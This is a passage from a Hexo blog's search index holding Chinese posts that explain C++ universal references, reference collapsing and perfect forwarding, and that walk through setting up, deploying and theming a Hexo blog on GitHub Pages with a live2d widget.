class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T &amp;&amp;)</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">B&lt;<span class="type">int</span>&gt; b;</span><br><span class="line">b.<span class="built_in">print</span>(<span class="number">3</span>);   <span class="comment">// 为右值引用</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在编译print之前print中的参数已经由B<int> b确定了，所以在print编译时无需推导，故B中的T&amp;&amp;为右值引用。如果改为如下：</int></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Arg&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(Arg &amp;&amp;)</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">B&lt;<span class="type">int</span>&gt; b;</span><br><span class="line">b.<span class="built_in">print</span>(<span class="number">3</span>);   <span class="comment">// 为右值引用</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 因为print时函数模板形参和类模板形参类型时独立的，故在编译print时是需要推导的，故Arg&amp;&amp;为通用引用。</p><h2 id="引用折叠"><a href="#引用折叠" class="headerlink" title="引用折叠"></a>引用折叠</h2><p>引用虽然形式上是右值引用，但是却可以接受左值，这是怎么实现的呢？这就是引用折叠。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T&amp;&amp; t)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">9</span>;</span><br><span class="line"><span class="built_in">print</span>(a);</span><br><span class="line"><span class="built_in">print</span>(<span class="number">9</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print(a)时，因为a为左值,会被推导成print(int&amp; &amp;&amp;t)形式，int&amp; &amp;&amp;t 会被折叠为int &amp;，所以最终形式为print(int &amp;)。（左值被推导为左值引用）</p><p> print(9)时，为9为右值，所以被推导为print(int&amp;&amp; &amp;&amp;)形式，而int&amp;&amp; &amp;&amp;会被折叠为int&amp;&amp;，所以最终形式为print(int&amp;&amp;)。（右值被推导为右值引用）</p><p>引用类型只有两种，所以折叠形式就是4中，为：T&amp; &amp;,T&amp; &amp;&amp;,T&amp;&amp; &amp;,T&amp;&amp; &amp;&amp;。引用折叠规则概况为两种：</p><p>T&amp;&amp; &amp;&amp;折叠为T&amp;&amp;;</p><p>其他折叠为T&amp;.</p><h2 id="完美转发"><a href="#完美转发" class="headerlink" title="完美转发"></a>完美转发</h2><p>通用引用既可以接受左值也可以接受右值，但是通用引用本身是左值。如果在函数模板中继续传递该值给其他函数，势必会改变该值的属性，即都为左值引用。</p><p>使用std::forward<T>(a)可以进行完美转发，使值属性和之前保持一致。某个功能对左值和右值处理情况不一致，如果将左值和右值引用当作同一种情况使用，可能会会有性能损失。例如左值进行深拷贝，右值进行移动。</T></p><p>原理是使用了引用折叠。具有推导类型的T&amp;&amp;转换会进行引用折叠。而int&amp;&amp;类型是确定的，不能进行折叠。</p><p>有两套，传入的为左或右，用右值进行强制类型转换，左右转化为左，右右转化为右</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo快速入门</title>
      <link href="/2023/03/20/hexo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
      <url>/2023/03/20/hexo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><span id="more"></span><p>新开一个文件夹，右键，在这里打开git bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><h2 id="配置github-SSH"><a href="#配置github-SSH" class="headerlink" title="配置github SSH"></a>配置github SSH</h2><p>ssh可以免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>在用户文件夹下生成了一个.ssh文件夹，进入，复制.pub文件中全部内容</p><p>打开github主页，点击个人设置，点击左侧的SSH and GPG keys，点击New SSH key</p><p>将id_rsa.pub复制的内容粘贴到key中，title随便起一个就行。</p><p>配置好用户名和邮箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;xxx&quot;</span> <span class="comment">#你的github用户名</span></span><br><span class="line">git config --global user.email <span class="string">&quot;xxx@163.com&quot;</span> <span class="comment">#填写你的github注册邮箱</span></span><br></pre></td></tr></table></figure><h1 id="写个人博客"><a href="#写个人博客" class="headerlink" title="写个人博客"></a>写个人博客</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h2 id="新建一个博客"><a href="#新建一个博客" class="headerlink" title="新建一个博客"></a>新建一个博客</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n &lt;title&gt;</span><br></pre></td></tr></table></figure><p>存放地址：<code>source/_posts</code></p><h2 id="解决图片问题"><a href="#解决图片问题" class="headerlink" title="解决图片问题"></a>解决图片问题</h2><p>_config.yml文件做如下修改：<code>yaml post_asset_folder: true</code></p><p>创建同名文件夹，可以放入图片</p><p>使用的是Typora编辑器，可以在编辑器的文件&#x2F;偏好设置&#x2F;图像中进行如下设置：</p><p>复制到指定路径<code>./$(filename)/</code></p><p>安装图片显示插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image</span><br></pre></td></tr></table></figure><h2 id="生成本地静态网站并预览"><a href="#生成本地静态网站并预览" class="headerlink" title="生成本地静态网站并预览"></a>生成本地静态网站并预览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>在文章中加入<code>&lt;!--more--&gt;</code>或在开头加入description: xxx</p><h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h1><p>新建一个库，名字叫 username.github.io</p><h2 id="将本地库与远端github仓库绑定"><a href="#将本地库与远端github仓库绑定" class="headerlink" title="将本地库与远端github仓库绑定"></a>将本地库与远端github仓库绑定</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;commit&quot;</span></span><br><span class="line">git remote add origin 仓库的http地址</span><br><span class="line">git pull --rebase origin main</span><br><span class="line">git push [-u] origin main</span><br></pre></td></tr></table></figure><h2 id="编辑-config-yml"><a href="#编辑-config-yml" class="headerlink" title="编辑_config.yml"></a>编辑_config.yml</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy<span class="punctuation">:</span></span><br><span class="line">  type<span class="punctuation">:</span> git</span><br><span class="line">  repository<span class="punctuation">:</span> 仓库的ssh地址</span><br><span class="line">  branch<span class="punctuation">:</span> main</span><br></pre></td></tr></table></figure><h2 id="在bash部署"><a href="#在bash部署" class="headerlink" title="在bash部署"></a>在bash部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h1 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</span><br></pre></td></tr></table></figure><h2 id="下载对应的主题"><a href="#下载对应的主题" class="headerlink" title="下载对应的主题"></a>下载对应的主题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><h2 id="更改配置文件"><a href="#更改配置文件" class="headerlink" title="更改配置文件"></a>更改配置文件</h2><p>编辑_config.yml</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme<span class="punctuation">:</span> butterfly</span><br></pre></td></tr></table></figure><h2 id="主题文档"><a href="#主题文档" class="headerlink" title="主题文档"></a>主题文档</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://butterfly.js.org/posts/21cfbf15/</span><br></pre></td></tr></table></figure><h1 id="开启live2d"><a href="#开启live2d" class="headerlink" title="开启live2d"></a>开启live2d</h1><h2 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h2 id="下载model文件"><a href="#下载model文件" class="headerlink" title="下载model文件"></a>下载model文件</h2><h3 id="模型浏览"><a href="#模型浏览" class="headerlink" title="模型浏览"></a>模型浏览</h3><p>live2d-widget-model-chitose<br>live2d-widget-model-epsilon2_1<br>live2d-widget-model-gf<br>live2d-widget-model-haru_01<br>live2d-widget-model-haru_02<br>live2d-widget-model-haruto<br>live2d-widget-model-hibiki<br>live2d-widget-model-hijiki<br>live2d-widget-model-izumi<br>live2d-widget-model-koharu<br>live2d-widget-model-miku<br>live2d-widget-model-nico<br>live2d-widget-model-nietzsche<br>live2d-widget-model-ni-j<br>live2d-widget-model-nipsilon<br>live2d-widget-model-nito<br>live2d-widget-model-shizuku<br>live2d-widget-model-tororo<br>live2d-widget-model-tsumiki<br>live2d-widget-model-unitychan<br>live2d-widget-model-wanko<br>live2d-widget-model-z16</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wang_123_zy/article/details/87181892</span><br></pre></td></tr></table></figure><h3 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置Hexo的主<code>_config.yml</code>或者使用的主题的<code>_config.yml</code></p><p>添加以下代码到配置文件中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## Live2D看板娘</span><br><span class="line">live2d<span class="punctuation">:</span></span><br><span class="line">  enable<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  pluginModelPath<span class="punctuation">:</span> assets/</span><br><span class="line">  model<span class="punctuation">:</span></span><br><span class="line">    #模板目录，在node_modules里</span><br><span class="line">    use<span class="punctuation">:</span> live2d-widget-model-shizuku  </span><br><span class="line">  display<span class="punctuation">:</span></span><br><span class="line">    position<span class="punctuation">:</span> right</span><br><span class="line">    width<span class="punctuation">:</span> <span class="number">300</span> </span><br><span class="line">    height<span class="punctuation">:</span> <span class="number">600</span></span><br><span class="line">  mobile<span class="punctuation">:</span></span><br><span class="line">    # 在手机端显示</span><br><span class="line">    show<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>   </span><br><span class="line">  rect<span class="punctuation">:</span></span><br><span class="line">    opacity<span class="punctuation">:</span><span class="number">0.7</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
